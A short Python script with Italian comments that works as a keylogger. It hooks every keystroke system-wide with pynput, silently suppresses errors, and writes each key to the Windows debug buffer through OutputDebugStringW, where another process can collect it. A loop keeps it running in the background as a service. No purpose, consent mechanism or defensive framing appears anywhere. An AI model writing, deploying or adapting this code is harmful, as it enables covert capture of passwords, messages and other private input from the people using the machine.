import ctypes
import time
from pynput import keyboard

# Funzione per inviare la stringa al buffer di debug di Windows
def log_to_debug(message):
    try:
        # OutputDebugStringW accetta stringhe Unicode
        ctypes.windll.kernel32.OutputDebugStringW(message)
    except Exception as e:
        pass

def on_press(key):
    try:
        # Tenta di leggere il carattere
        if hasattr(key, 'char') and key.char is not None:
            msg = key.char
        else:
            # Gestione tasti speciali
            if key == keyboard.Key.space:
                msg = " "
            elif key == keyboard.Key.enter:
                msg = "\n"
            else:
                msg = f"[{key}]"
        
        log_to_debug(msg)
    except Exception:
        pass

def main():
    # Avvia il listener in un thread separato
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Mantiene il processo in esecuzione (necessario per un servizio)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        listener.stop()

if __name__ == "__main__":
    main()
